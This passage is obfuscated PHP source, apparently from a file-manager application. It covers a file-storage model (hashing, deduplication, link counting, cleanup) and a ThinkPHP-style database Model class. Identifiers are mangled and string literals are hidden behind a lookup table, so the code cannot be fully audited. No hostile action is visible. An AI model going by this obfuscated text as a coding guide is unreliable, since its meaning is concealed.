(!IO::isFile($÷Öû¦‡[$—ÕïĞÊ¸[87]])) { return !1; } $÷Öû¦‡[$—ÕïĞÊ¸[79]] = intval($÷Öû¦‡[$—ÕïĞÊ¸[79]]); if (!$÷Öû¦‡[$—ÕïĞÊ¸[79]] && strlen($÷Öû¦‡[$—ÕïĞÊ¸[679]]) > 32) { $÷Öû¦‡[$—ÕïĞÊ¸[79]] = intval(substr($÷Öû¦‡[$—ÕïĞÊ¸[679]], 32)); } $÷„¿Â  = $this->add($÷Öû¦‡); return $this->find($÷„¿Â ); } public function addFile($øºİß±, $˜ŸÓ÷«, $ª†œ˜¯, $‘³ˆñÃã = false) { $öœÔŒ¦È =& $_SERVER[ùèÅ´Ãš]; $÷¬Î¶€É = IO::hashSimple($øºİß±); $İÙöîäË = IO::size($øºİß±); $éá×—–» = $İÙöîäË <= 1024 * 1024 * 10 ? IO::hashMd5($øºİß±) : $öœÔŒ¦È[12]; $¤·À–æ = $öœÔŒ¦È[2061] . $÷¬Î¶€É; CacheLock::lock($¤·À–æ); if ($éá×—–» && $÷¬Î¶€É) { $Œõ½¬˜ù = $this->addFileCheckExist($÷¬Î¶€É, $éá×—–», $İÙöîäË); if ($Œõ½¬˜ù) { CacheLock::unlock($¤·À–æ); return $Œõ½¬˜ù; } } $¬¥ÁÒÁƒ = $this->addFileMake($øºİß±, $˜ŸÓ÷«, $İÙöîäË, $÷¬Î¶€É, $éá×—–», $ª†œ˜¯, $‘³ˆñÃã); $ÁŸÎºøÛ = $this->addFileData($¬¥ÁÒÁƒ); if (!$ÁŸÎºøÛ) { return !1; } CacheLock::unlock($¤·À–æ); if (!$éá×—–» && $ÁŸÎºøÛ) { $this->fileMd5Check($ÁŸÎºøÛ); } return $ÁŸÎºøÛ; } public function fileMd5Check($»åàú²·) { $€ÉŠÀÒ• =& $_SERVER[ùèÅ´Ãš]; $Õ‹…¶Æ³ = array($»åàú²·[$€ÉŠÀÒ•[545]], $»åàú²·[$€ÉŠÀÒ•[87]]); $³ÍŒÔÅ = $€ÉŠÀÒ•[2062] . $»åàú²·[$€ÉŠÀÒ•[87]]; $Í·ì›ˆƒ = $€ÉŠÀÒ•[2063] . $»åàú²·[$€ÉŠÀÒ•[545]]; TaskQueue::add($€ÉŠÀÒ•[2064], $Õ‹…¶Æ³, $³ÍŒÔÅ, $Í·ì›ˆƒ); } public function fileMd5Set($‰Üñ Ş, $ñÏºú¯) { $€£¿Ğ =& $_SERVER[ùèÅ´Ãš]; $•Ã£¹Ä¶ = $this->find($‰Üñ Ş); if (!$•Ã£¹Ä¶ || $•Ã£¹Ä¶[$€£¿Ğ[551]]) { return; } $»À¿º• = IO::hashMd5($ñÏºú¯); if (!$»À¿º•) { return $€£¿Ğ[12]; } $this->where(array($€£¿Ğ[545] => $‰Üñ Ş))->save(array($€£¿Ğ[551] => $»À¿º•)); } public function addFileMake($æİèÚúƒ, $ÏÉéĞÊˆ, $Á‰Õù¿, $•ƒâï³Á, $Öä¿ş—ü, $…ÌÇÉ¶¹, $™»ı­Ó²) { $ö¬áØ‹ˆ =& $_SERVER[ùèÅ´Ãš]; $®ˆÊ—Ô­ = $this->createFileName($…ÌÇÉ¶¹, $ÏÉéĞÊˆ, $•ƒâï³Á, $Öä¿ş—ü); $„ÉŒôæ« = get_path_father($®ˆÊ—Ô­); $ÆÙİÄş® = get_path_this($®ˆÊ—Ô­); if ($™»ı­Ó²) { $ıšªüÔ‚ = IO::move($æİèÚúƒ, $„ÉŒôæ«, !1, $ÆÙİÄş®); } else { $ıšªüÔ‚ = IO::copy($æİèÚúƒ, $„ÉŒôæ«, !1, $ÆÙİÄş®); } if (!$ıšªüÔ‚) { return !1; } $†…µß = IO::init($ıšªüÔ‚); $†…µß->cacheMethod($ö¬áØ‹ˆ[182], $†…µß->path, $ö¬áØ‹ˆ[179]); if (IO::size($ıšªüÔ‚) != $Á‰Õù¿) { return !1; } $øˆ¢ã¯õ = array($ö¬áØ‹ˆ[624] => $Á‰Õù¿, $ö¬áØ‹ˆ[2058] => 1, $ö¬áØ‹ˆ[496] => $…ÌÇÉ¶¹, $ö¬áØ‹ˆ[891] => $ÏÉéĞÊˆ[$ö¬áØ‹ˆ[477]], $ö¬áØ‹ˆ[497] => $®ˆÊ—Ô­, $ö¬áØ‹ˆ[2059] => $•ƒâï³Á, $ö¬áØ‹ˆ[2060] => $Öä¿ş—ü); return $øˆ¢ã¯õ; } public function addFileCheckExist($Ôõ·Öàô, $„ƒÖ´Ÿ, $¦ñ·òæ‘) { $©ñİêƒœ =& $_SERVER[ùèÅ´Ãš]; $øó¼Ì„Â = $this->findByHash($Ôõ·Öàô, $„ƒÖ´Ÿ); if (!$øó¼Ì„Â) { return !1; } $¬®ÖÃİË = array($©ñİêƒœ[2058] => intval($øó¼Ì„Â[$©ñİêƒœ[2065]]) + 1, $©ñİêƒœ[624] => $¦ñ·òæ‘); $this->where(array($©ñİêƒœ[546] => $øó¼Ì„Â[$©ñİêƒœ[545]]))->save($¬®ÖÃİË); return $øó¼Ì„Â; } public function remove($Î‘¬‰å–) { $this->linkCountChange($Î‘¬‰å–, !1); $this->clearEmpty(); return !0; } public function linkAdd($˜ƒôïÊÏ) { $this->linkCountChange($˜ƒôïÊÏ, !0); } public function linkCountChange($“ÛŒÒ º, $¶–¦ğ›) { $ÙœÅ©› =& $_SERVER[ùèÅ´Ãš]; if (!$“ÛŒÒ º) { return; } if (!is_array($“ÛŒÒ º)) { $“ÛŒÒ º = array($“ÛŒÒ º); } $½——œıÍ = array(); foreach ($“ÛŒÒ º as $½«¯½êô) { $×œ¼³‹Æ = $½«¯½êô . $ÙœÅ©›[12]; if (!$½——œıÍ[$×œ¼³‹Æ]) { $½——œıÍ[$×œ¼³‹Æ] = 0; } $½——œıÍ[$×œ¼³‹Æ]++; } $êŸäñ’ = array(); foreach ($½——œıÍ as $½«¯½êô => $­î±Š‚€) { $×œ¼³‹Æ = $­î±Š‚€ . $ÙœÅ©›[12]; if (!$êŸäñ’[$×œ¼³‹Æ]) { $êŸäñ’[$×œ¼³‹Æ] = array(); } $êŸäñ’[$×œ¼³‹Æ][] = $½«¯½êô; } foreach ($êŸäñ’ as $­î±Š‚€ => $˜ÖÄæ§) { if (!$˜ÖÄæ§) { continue; } $­î±Š‚€ = $¶–¦ğ› ? $­î±Š‚€ : -intval($­î±Š‚€); $ĞºÙÓ„í = array($ÙœÅ©›[545] => array($ÙœÅ©›[7], $˜ÖÄæ§)); if ($­î±Š‚€ < 0) { $ĞºÙÓ„í[$ÙœÅ©›[2065]] = array($ÙœÅ©›[1103], abs($­î±Š‚€)); } $this->where($ĞºÙÓ„í)->setAdd($ÙœÅ©›[2065], $­î±Š‚€); } } public function findByHash($¶ÈÖ„¢Å, $åµ¶ÃÜå = false) { $şäıçÆÊ =& $_SERVER[ùèÅ´Ãš]; if (!$¶ÈÖ„¢Å && !$åµ¶ÃÜå) { return !1; } $øÁı±©á = array($şäıçÆÊ[2059] => $¶ÈÖ„¢Å); if ($åµ¶ÃÜå) { $øÁı±©á = array($şäıçÆÊ[2060] => $åµ¶ÃÜå); } return $this->order($şäıçÆÊ[2066])->where($øÁı±©á)->find(); } public function clearEmpty($çÄ§ÕãÖ = 1) { $®ËõÊ¼ =& $_SERVER[ùèÅ´Ãš]; $È­…¢Ì = time() - 3600 * 24 * $çÄ§ÕãÖ; $óÑİ · = $®ËõÊ¼[2067] . $È­…¢Ì; $µ¼èêãõ = $this->where($óÑİ ·)->select(); if (!$µ¼èêãõ) { return; } $û‰â«— = new Task($®ËõÊ¼[2068], $®ËõÊ¼[12], count($µ¼èêãõ)); foreach ($µ¼èêãõ as $öüúè¾) { $û‰â«—->update(1); $this->resetFile($öüúè¾); } $û‰â«—->end(); } public function resetFile($À©Ì¯æş) { $Ò©Æ³¥Ç =& $_SERVER[ùèÅ´Ãš]; $Ä°Ò€¶ = array($Ò©Æ³¥Ç[546] => $À©Ì¯æş[$Ò©Æ³¥Ç[545]]); $£Â©º°² = Model($Ò©Æ³¥Ç[1442])->where($Ä°Ò€¶)->count(); $Ÿ·Ëè”¨ = Model($Ò©Æ³¥Ç[2069])->where($Ä°Ò€¶)->count(); $üâÒ°è = intval($£Â©º°²) + intval($Ÿ·Ëè”¨); if ($üâÒ°è == 0) { Model($Ò©Æ³¥Ç[2070])->delete($À©Ì¯æş[$Ò©Æ³¥Ç[545]]); $this->where($Ä°Ò€¶)->delete(); $this->metaSet($À©Ì¯æş[$Ò©Æ³¥Ç[545]], null, null); if (!IO::isFile($À©Ì¯æş[$Ò©Æ³¥Ç[87]])) { write_log(array($Ò©Æ³¥Ç[2071], ACTION, $À©Ì¯æş), $Ò©Æ³¥Ç[1278]); return !1; } IO::remove($À©Ì¯æş[$Ò©Æ³¥Ç[87]]); write_log(ACTION . $Ò©Æ³¥Ç[2072] . KodUser::id() . $Ò©Æ³¥Ç[2073] . $À©Ì¯æş[$Ò©Æ³¥Ç[545]] . $Ò©Æ³¥Ç[2074] . $À©Ì¯æş[$Ò©Æ³¥Ç[79]] . $Ò©Æ³¥Ç[202] . $À©Ì¯æş[$Ò©Æ³¥Ç[87]], $Ò©Æ³¥Ç[2071]); return; } if ($À©Ì¯æş[$Ò©Æ³¥Ç[2065]] != $üâÒ°è) { $this->where($Ä°Ò€¶)->save(array($Ò©Æ³¥Ç[2058] => $üâÒ°è)); } } public function storageInfo($Â¤ƒöÇó = false) { $ãÓØ¹×ñ =& $_SERVER[ùèÅ´Ãš]; $ÜÄü—šÂ = $this->count() + 0.0; $Ûáª… = 0; $„¨µ÷ƒ´ = 1; $ïçÓ½à¸ = 0; $™´¼î = 5000; for ($€¤€¨©€ = 0; $€¤€¨©€ < $ÜÄü—šÂ; $€¤€¨©€ = $€¤€¨©€ + $™´¼î) { $ÔÖÄáÔ£ = $this->limit($€¤€¨©€, $€¤€¨©€ + $™´¼î)->select(); foreach ($ÔÖÄáÔ£ as $Ÿ›½ıÌ°) { $„¨µ÷ƒ´ += $Ÿ›½ıÌ°[$ãÓØ¹×ñ[79]] * $Ÿ›½ıÌ°[$ãÓØ¹×ñ[2065]]; $Ûáª… += $Ÿ›½ıÌ°[$ãÓØ¹×ñ[79]] * ($Ÿ›½ıÌ°[$ãÓØ¹×ñ[2065]] - 1); $ïçÓ½à¸ += $Ÿ›½ıÌ°[$ãÓØ¹×ñ[2065]]; } } $áİ©Íç› = array($ãÓØ¹×ñ[2075] => $„¨µ÷ƒ´, $ãÓØ¹×ñ[2076] => $Ûáª…, $ãÓØ¹×ñ[2077] => $Ûáª… / $„¨µ÷ƒ´, $ãÓØ¹×ñ[83] => $ÜÄü—šÂ, $ãÓØ¹×ñ[2078] => $ïçÓ½à¸); return $áİ©Íç›; } } goto c’èÊ°ÓÕá; D®Š»…Ò×Ï: define($_SERVER[ùèÅ´Ãš][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\145", "\x6f\x72\144\x65\162", "\x61\x6c\x69\141\x73", "\x68\x61\166\x69\x6e\147", "\x67\x72\x6f\165\160", "\x6c\x6f\x63\153", "\144\x69\x73\164\151\x6e\x63\x74", "\x61\165\x74\157", "\x66\x69\x6c\164\145\x72", "\166\141\x6c\151\144\141\x74\x65", "\162\145\163\x75\154\x74", "\142\151\x6e\144", "\164\x6f\153\x65\x6e"); public function __construct($’Ã‡¨á‰ = '', $­Àøóó” = '', $ÆÜëÇ = '') { $‹Øä—Î =& $_SERVER[ùèÅ´Ãš]; $this->_initialize(); if (!empty($’Ã‡¨á‰)) { if (strpos($’Ã‡¨á‰, $‹Øä—Î[10])) { list($this->dbName, $this->name) = explode($‹Øä—Î[10], $’Ã‡¨á‰); } else { $this->name = $’Ã‡¨á‰; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($­Àøóó”)) { $this->tablePrefix = $‹Øä—Î[12]; } elseif ($‹Øä—Î[12] != $­Àøóó”) { $this->tablePrefix = $­Àøóó”; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($‹Øä—Î[324]); } $this->db(0, empty($this->connection) ? $ÆÜëÇ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Åø¡©œ =& $_SERVER[ùèÅ´Ãš]; if (empty($this->fields)) { if (think_config($Åø¡©œ[325])) { $ë¾ĞœÂû = $this->dbName ? $this->dbName : think_config($Åø¡©œ[326]); $¯·ÅŠ§ = think_var_cache($Åø¡©œ[327] . strtolower(get_path_this($ë¾ĞœÂû) . $Åø¡©œ[10] . $this->name)); if ($¯·ÅŠ§) { $ò‚›«† = think_config($Åø¡©œ[328]); if (empty($ò‚›«†) || $¯·ÅŠ§[$Åø¡©œ[329]] == $ò‚›«†) { $this->fields = $¯·ÅŠ§; return; } } } $this->flush(); } } public function flush() { $âµÀËá» =& $_SERVER[ùèÅ´Ãš]; $this->db->setModel($this->name); $éÛ¦–Ãé = $this->db->getFields($this->getTableName()); if (!$éÛ¦–Ãé) { return !1; } $this->fields = array_keys($éÛ¦–Ãé); $this->fields[$âµÀËá»[330]] = !1; foreach ($éÛ¦–Ãé as $ë²àªû· => $÷—£ñ²²) { $Á¾ã¡õä[$ë²àªû·] = $÷—£ñ²²[$âµÀËá»[33]]; if ($÷—£ñ²²[$âµÀËá»[39]]) { $this->fields[$âµÀËá»[331]] = $ë²àªû·; if ($÷—£ñ²²[$âµÀËá»[42]]) { $this->fields[$âµÀËá»[330]] = !0; } } } $this->fields[$âµÀËá»[332]] = $Á¾ã¡õä; if (think_config($âµÀËá»[328])) { $this->fields[$âµÀËá»[329]] = think_config($âµÀËá»[328]); } if (think_config($âµÀËá»[325])) { $¤ÒÌ¯ãÈ = $this->dbName ? $this->dbName : think_config($âµÀËá»[326]); think_var_cache($âµÀËá»[327] . strtolower(get_path_this($¤ÒÌ¯ãÈ) . $âµÀËá»[10] . $this->name), $this->fields); } } public function switchModel($š‘ïğ‰„, $õŸ¤ú = array()) { $ÀÈâí¹ı =& $_SERVER[ùèÅ´Ãš]; $±æÜøÊ = ucwords(strtolower($š‘ïğ‰„)) . $ÀÈâí¹ı[333]; if (!class_exists($±æÜøÊ)) { think_exception($±æÜøÊ . think_lang($ÀÈâí¹ı[334])); } $this->_extModel = new $±æÜøÊ($this->name); if (!empty($õŸ¤ú)) { foreach ($õŸ¤ú as $À›—˜Ÿü) { $this->_extModel->setProperty($À›—˜Ÿü, $this->{$À›—˜Ÿü}); } } return $this->_extModel; } public function __set($Úıò´çß, $§–öåÊ¶) { $this->data[$Úıò´çß] = $§–öåÊ¶; } public function __get($õ’¡£¨­) { return isset($this->data[$õ’¡£¨­]) ? $this->data[$õ’¡£¨­] : null; } public function __isset($ñªˆ ×Ä) { return isset($this->data[$ñªˆ ×Ä]); } public function __unset($‡½êü‰¥) { unset($this->data[$‡½êü‰¥]); } public function __call($à²²¡ı­, $ğá§ê) { $»£—€É° =& $_SERVER[ùèÅ´Ãš]; if (in_array(strtolower($à²²¡ı­), $this->methods, !0)) { $this->options[strtolower($à²²¡ı­)] = $ğá§ê[0]; return $this; } elseif (in_array(strtolower($à²²¡ı­), array($»£—€É°[335], $»£—€É°[336], $»£—€É°[337], $»£—€É°[338], $»£—€É°[339]), !0)) { $ß¸è•‹Å = isset($ğá§ê[0]) ? $ğá§ê[0] : $»£—€É°[223]; $ß¸è•‹Å = $this->db->parseKey($ß¸è•‹Å); return $this->getField(strtoupper($à²²¡ı­) . $»£—€É°[340] . $ß¸è•‹Å . $»£—€É°[341] . $à²²¡ı­, $»£—€É°[335]); } elseif (strtolower(substr($à²²¡ı­, 0, 5)) == $»£—€É°[342]) { $ß¸è•‹Å = think_parse_name(substr($à²²¡ı­, 5)); $¥›Ü•²­[$ß¸è•‹Å] = $ğá§ê[0]; return $this->where($¥›Ü•²­)->find(); } elseif (strtolower(substr($à²²¡ı­, 0, 10)) == $»£—€É°[343]) { $­ üÁ¡ş = think_parse_name(substr($à²²¡ı­, 10)); $¥›Ü•²­[$­ üÁ¡ş] = $ğá§ê[0]; return $this->where($¥›Ü•²­)->getField($ğá§ê[1]); } elseif (isset($this->_scope[$à²²¡ı­])) { return $this->scope($à²²¡ı­, $ğá§ê[0]); } elseif (method_exists($this, $à²²¡ı­)) { array_unshift($ğá§ê, $à²²¡ı­); return call_user_func_array(array($this, $»£—€É°[344]), $ğá§ê); } else { return call_user_func_array(array(parent, $à²²¡ı­), $ğá§ê); } } protected function call() { $¾£°ÛÜ =& $_SERVER[ùèÅ´Ãš]; $âõ²ÊúÜ = func_get_args(); $›ç—´‡ = array_shift($âõ²ÊúÜ); $İïñ™¡ = $›ç—´‡; if (is_array($›ç—´‡)) { $İïñ™¡ = $›ç—´‡[1]; $›ç—´‡ = $›ç—´‡[0]; } $›û©³§˜ = count($âõ²ÊúÜ) - 1; if (isset($âõ²ÊúÜ[$›û©³§˜]) && $âõ²ÊúÜ[$›û©³§˜] === $›ç—´‡) { think_exception(__CLASS__ . $¾£°ÛÜ[4] . $›ç—´‡ . think_lang($¾£°ÛÜ[345])); return; } $âõ²ÊúÜ[] = $›ç—´‡; if (method_exists($this, $¾£°ÛÜ[346])) { $Ğ±Á˜À¿ = call_user_func_array(array($this, $¾£°ÛÜ[347]), array($İïñ™¡, $âõ²ÊúÜ)); if (!is_null($Ğ±Á˜À¿) && $Ğ±Á˜À¿ !== !1) { return $Ğ±Á˜À¿; } } $¹åÀœßí = call_user_func_array(array($this, $›ç—´‡), $âõ²ÊúÜ); if (method_exists($this, $¾£°ÛÜ[348])) { $Ğ±Á˜À¿ = call_user_func_array(array($this, $¾£°ÛÜ[349]), array($İïñ™¡, $âõ²ÊúÜ, $¹åÀœßí)); if ($Ğ±Á˜À¿) { return $Ğ±Á˜À¿; } } return $¹åÀœßí; } protected function _initialize() { } protected function _facade($ğºÉË”º) { $”ÄÏ„¨ø =& $_SERVER[ùèÅ´Ãš]; if (!empty($this->fields)) { foreach ($ğºÉË”º as $üØ»µ§õ => $åÊåşŞ—) { if (is_array($this->fields) && !in_array($üØ»µ§õ, $this->fields, !0)) { unset($ğºÉË”º[$üØ»µ§õ]); } elseif (is_scalar($åÊåşŞ—)) { $this->_parseType($ğºÉË”º, $üØ»µ§õ); } } } if (!empty($this->options[$”ÄÏ„¨ø[350]])) { $ğºÉË”º = array_map($this->options[$”ÄÏ„¨ø[350]], $ğºÉË”º); unset($this->options[$”ÄÏ„¨ø[350]]); } $this->_beforeWrite($ğºÉË”º); return $ğºÉË”º; } protected function _beforeWrite(&$Â³í) { } public function add($ÊÛÄ“­ã = '', $öèØ¨¬Ø = array(), $é‰Ì ÁŸ = false) { if (empty($ÊÛÄ“­ã)) { if (!empty($this->data)) { $ÊÛÄ“­ã = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ùèÅ´Ãš][351]); return !1; } } $öèØ¨¬Ø = $this->_parseOptions($öèØ¨¬Ø); $ÊÛÄ“­ã = $this->_facade($ÊÛÄ“­ã); if (!1 === $this->_beforeInsert($ÊÛÄ“­ã, $öèØ¨¬Ø)) { return !1; } $Ö¬œïŸó = $this->db->insert($ÊÛÄ“­ã, $öèØ¨¬Ø, $é‰Ì ÁŸ); if (!1 !== $Ö¬œïŸó) { $Ùù÷Šåœ = $this->getLastInsID(); if ($Ùù÷Šåœ) { $ÊÛÄ“­ã[$this->getPk()] = $Ùù÷Šåœ; $this->_after_insert($ÊÛÄ“­ã, $öèØ¨¬Ø); return $Ùù÷Šåœ; } $this->_after_insert($ÊÛÄ“­ã, $öèØ¨¬Ø); } return $Ö¬œïŸó; } protected function _beforeInsert(&$Š¨ŸÆ”ê, $Ş“Œãş©) { } protected function _after_insert($ÙÛÍóÛÑ, $×¡êâ«§) { } public function addAll($¨äß’Ç, $Øçïëºˆ = array(), $ßÉ¤Å¤  = false) { $™á‚ŞÛ =& $_SERVER[ùèÅ´Ãš]; if (empty($¨äß’Ç)) { $this->error = think_lang($™á‚ŞÛ[351]); return !1; } $Øçïëºˆ = $this->_parseOptions($Øçïëºˆ); foreach ($¨äß’Ç as $œÙÒÑûá => $ÕÂÙ¯‹) { $¨äß’Ç[$œÙÒÑûá] = $this->_facade($ÕÂÙ¯‹); } if (method_exists($this->db, $™á‚ŞÛ[352])) { $…¥ÁşÈæ = $this->db->insertAll($¨äß’Ç, $Øçïëºˆ, $ßÉ¤Å¤ ); } else { $this->startTrans(); foreach ($¨äß’Ç as $œÙÒÑûá => $ÕÂÙ¯‹) { $…¥ÁşÈæ = $this->db->insert($ÕÂÙ¯‹, $Øçïëºˆ, $ßÉ¤Å¤ ); } $this->commit(); } if (!1 !== $…¥ÁşÈæ) { $ı©®¶ÕÛ = $this->getLastInsID(); if ($ı©®¶ÕÛ) { return $ı©®¶ÕÛ; } } return $…¥ÁşÈæ; } public function selectAdd($®ª™ÔŞÛ = '', $û¨„È¥ñ = '', $Îö†Ôò = array()) { $ôºşŠÖØ =& $_SERVER[ùèÅ´Ãš]; $Îö†Ôò = $this->_parseOptions($Îö†Ôò); if (!1 === ($ğÍ«ÔËõ = $this->db->selectInsert($®ª™ÔŞÛ ? $®ª™ÔŞÛ : $Îö†Ôò[$ôºşŠÖØ[353]], $û¨„È¥ñ ? $û¨„È¥ñ : $this->getTableName(), $Îö†Ôò))) { $this->error = think_lang($ôºşŠÖØ[354]); return !1; } else { return $ğÍ«ÔËõ; } } public function save($Ş†İÒãü = '', $„Ç¦ß = array()) { $Ó“ãÔáö =& $_SERVER[ùèÅ´Ãš]; if (empty($Ş†İÒãü)) { if (!empty($this->data)) { $Ş†İÒãü = $this->data; $this->data = array(); } else { $this->error = think_lang($Ó“ãÔáö[351]); return !1; } } $Ş†İÒãü = $this->_facade($Ş†İÒãü); $„Ç¦ß = $this->_parseOptions($„Ç¦ß); $İÊòÌ¬ = $this->getPk(); if (!isset($„Ç¦ß[$Ó“ãÔáö[355]])) { if (isset($Ş†İÒãü[$İÊòÌ¬])) { $ğù¬ÈÜ¸[$İÊòÌ¬] = $Ş†İÒãü[$İÊòÌ¬]; $„Ç¦ß[$Ó“ãÔáö[355]] = $ğù¬ÈÜ¸; unset($Ş†İÒãü[$İÊòÌ¬]); } else { $this->error = think_lang($Ó“ãÔáö[354]); return !1; } } if (is_array($„Ç¦ß[$Ó“ãÔáö[355]]) && isset($„Ç¦ß[$Ó“ãÔáö[355]][$İÊòÌ¬])) { $âÕºÀÜ = $„Ç¦ß[$Ó“ãÔáö[355]][$İÊòÌ¬]; } if (!1 === $this->_beforeUpdate($Ş†İÒãü, $„Ç¦ß)) { return !1; } $ğí™é‡ä = $this->db->update($Ş†İÒãü, $„Ç¦ß); if (!1 !== $ğí™é‡ä) { if (isset($âÕºÀÜ)) { $Ş†İÒãü[$İÊòÌ¬] = $âÕºÀÜ; } $this->_afterUpdate($Ş†İÒãü, $„Ç¦ß); } return $ğí™é‡ä; } protected function _beforeUpdate(&$ÒøÃ¾Äª, $™±¢ó‡÷) { } protected function _afterUpdate($íè°¬æ, $ùÑİªÎ´) { } public function delete($ì­ËÈ±í = array()) { $éã€é¡¨ =& $_SERVER[ùèÅ´Ãš]; if (empty($ì­ËÈ±í) && empty($this->options[$éã€é¡¨[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $¤ê¸ı°ò = $this->getPk(); if (is_numeric($ì­ËÈ±í) || is_string($ì­ËÈ±í)) { if (strpos($ì­ËÈ±í, $éã€é¡¨[50])) { $ç¤Œúº[$¤ê¸ı°ò] = array($éã€é¡¨[356], $ì­ËÈ±í); } else { $ç¤Œúº[$¤ê¸ı°ò] = $ì­ËÈ±í; } $this->options[$éã€é¡¨[355]] = $ç¤Œúº; } $ì­ËÈ±í = $this->_parseOptions(); if (is_array($ì­ËÈ±í[$éã€é¡¨[355]]) && isset($ì­ËÈ±í[$éã€é¡¨[355]][$¤ê¸ı°ò])) { $î¨‡µƒ‘ = $ì­ËÈ±í[$éã€é¡¨[355]][$¤ê¸ı°ò]; } $«‘½úÃÃ = $this->db->delete($ì­ËÈ±í); if (!1 !== $«‘½úÃÃ) { $ì•ÚÁ‰ = array(); if (isset($î¨‡µƒ‘)) { $ì•ÚÁ‰[$¤ê¸ı°ò] = $î¨‡µƒ‘; } $this->_after_delete($ì•ÚÁ‰, $ì­ËÈ±í); } return $«‘½úÃÃ; } protected function _after_delete($ã ì­è«, $¨Ìå²¶¯) { } public function select($¾Æ„¦ˆ¸ = array()) { $Èó÷ğòù =& $_SERVER[ùèÅ´Ãš]; if (is_string($¾Æ„¦ˆ¸) || is_numeric($¾Æ„¦ˆ¸)) { $¶ıÛÒãî = $this->getPk(); if (strpos($¾Æ„¦ˆ¸, $Èó÷ğòù[50])) { $Ÿ‰öƒê[$¶ıÛÒãî] = array($Èó÷ğòù[356], $¾Æ„¦ˆ¸); } else { $Ÿ‰öƒê[$¶ıÛÒãî] = $¾Æ„¦ˆ¸; } $this->options[$Èó÷ğòù[355]] = $Ÿ‰öƒê; } elseif (!1 === $¾Æ„¦ˆ¸) { $¾Æ„¦ˆ¸ = $this->_parseOptions(); return $Èó÷ğòù[357] . $this->db->buildSelectSql($¾Æ„¦ˆ¸) . $Èó÷ğòù[358]; } $¾Æ„¦ˆ¸ = $this->_parseOptions(); $×ú×ğÉÇ = $this->db->select($¾Æ„¦ˆ¸); if (!1 === $×ú×ğÉÇ) { return !1; } if (empty($×ú×ğÉÇ)) { return null; } $this->_afterSelect($×ú×ğÉÇ, $¾Æ„¦ˆ¸); return $×ú×ğÉÇ; } protected function _afterSelect(&$”Ÿ“¡€€, $¾º‡˜µş) { } public function buildSql($É¡Œ‘„¯ = array()) { $ÆÈ™ßİÖ =& $_SERVER[ùèÅ´Ãš]; $É¡Œ‘„¯ = $this->_parseOptions($É¡Œ‘„¯); return $ÆÈ™ßİÖ[357] . $this->db->buildSelectSql($É¡Œ‘„¯) . $ÆÈ™ßİÖ[358]; } public function optionsValue($šÀµí–å = null) { if (is_null($šÀµí–å)) { return $this->options; } elseif (is_array($šÀµí–å)) { $this->options = array_merge($this->options, $šÀµí–å); } } protected function _parseOptions($ÛŸä·¸ = array()) { $ß ŞÀù´ =& $_SERVER[ùèÅ´Ãš]; if (is_array($ÛŸä·¸)) { $ÛŸä·¸ = array_merge($this->options, $ÛŸä·¸); } $this->options = array(); if (!isset($ÛŸä·¸[$ß ŞÀù´[359]])) { $ÛŸä·¸[$ß ŞÀù´[359]] = $this->getTableName(); $„ŒŞ”×  = $this->fields; } else { $„ŒŞ”×  = $this->getDbFields(); } if (!empty($ÛŸä·¸[$ß ŞÀù´[360]])) { $ÛŸä·¸[$ß ŞÀù´[359]] .= $ß ŞÀù´[53] . $ÛŸä·¸[$ß ŞÀù´[360]]; } $ÛŸä·¸[$ß ŞÀù´[361]] = $this->name; if (isset($ÛŸä·¸[$ß ŞÀù´[355]]) && is_array($ÛŸä·¸[$ß ŞÀù´[355]]) && !empty($„ŒŞ”× ) && !isset($ÛŸä·¸[$ß ŞÀù´[362]]) && !isset($ÛŸä·¸[$ß ŞÀù´[359]])) { foreach ($ÛŸä·¸[$ß ŞÀù´[355]] as $‹µ·áÃ³ => $ú…±™õ‡) { $‹µ·áÃ³ = trim($‹µ·áÃ³); if (in_array($‹µ·áÃ³, $„ŒŞ”× , !0)) { if (is_scalar($ú…±™õ‡)) { $this->_parseType($ÛŸä·¸[$ß ŞÀù´[355]], $‹µ·áÃ³); } } elseif (!is_numeric($‹µ·áÃ³) && $ß ŞÀù´[11] != substr($‹µ·áÃ³, 0, 1) && !1 === strpos($‹µ·áÃ³, $ß ŞÀù´[10]) && !1 === strpos($‹µ·áÃ³, $ß ŞÀù´[340]) && !1 === strpos($‹µ·áÃ³, $ß ŞÀù´[215]) && !1 === strpos($‹µ·áÃ³, $ß ŞÀù´[287])) { unset($ÛŸä·¸[$ß ŞÀù´[355]][$‹µ·áÃ³]); } } } $this->_options_filter($ÛŸä·¸); return $ÛŸä·¸; } protected function _options_filter(&$ñ…º³­Ò) { } protected function _parseType(&$¼©ù¡›Á, $œ¿ªÒØ) { $ø ÀöùÉ =& $_SERVER[ùèÅ´Ãš]; if (empty($this->options[$ø ÀöùÉ[363]][$ø ÀöùÉ[4] . $œ¿ªÒØ])) { $¬ÅÖ¨˜Ò = strtolower($this->fields[$ø ÀöùÉ[332]][$œ¿ªÒØ]); if (!1 !== strpos($¬ÅÖ¨˜Ò, $ø ÀöùÉ[364])) { } elseif (!1 === strpos($¬ÅÖ¨˜Ò, $ø ÀöùÉ[365]) && !1 !== strpos($¬ÅÖ¨˜Ò, $ø ÀöùÉ[366])) { $¼©ù¡›Á[$œ¿ªÒØ] = intval($¼©ù¡›Á[$œ¿ªÒØ]); } elseif (!1 !== strpos($¬ÅÖ¨˜Ò, $ø ÀöùÉ[367]) || !1 !== strpos($¬ÅÖ¨˜Ò, $ø ÀöùÉ[368])) { $¼©ù¡›Á[$œ¿ªÒØ] = floatval($¼©ù¡›Á[$œ¿ªÒØ]); } elseif (!1 !== strpos($¬ÅÖ¨˜Ò, $ø ÀöùÉ[369])) { $¼©ù¡›Á[$œ¿ªÒØ] = (bool) $¼©ù¡›Á[$œ¿ªÒØ]; } } } public function find($àµ·¤§ = array()) { $±Æï«‡û =& $_SERVER[ùèÅ´Ãš]; if 